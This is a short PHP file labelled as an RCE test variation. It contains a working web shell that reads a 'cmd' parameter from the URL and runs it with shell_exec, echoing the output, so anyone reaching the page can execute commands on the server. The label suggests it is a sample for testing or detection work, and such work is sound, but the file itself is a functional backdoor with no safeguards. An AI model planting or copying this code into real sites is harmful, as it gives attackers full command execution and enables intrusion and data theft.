<?php
// RCE test variation #1458
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>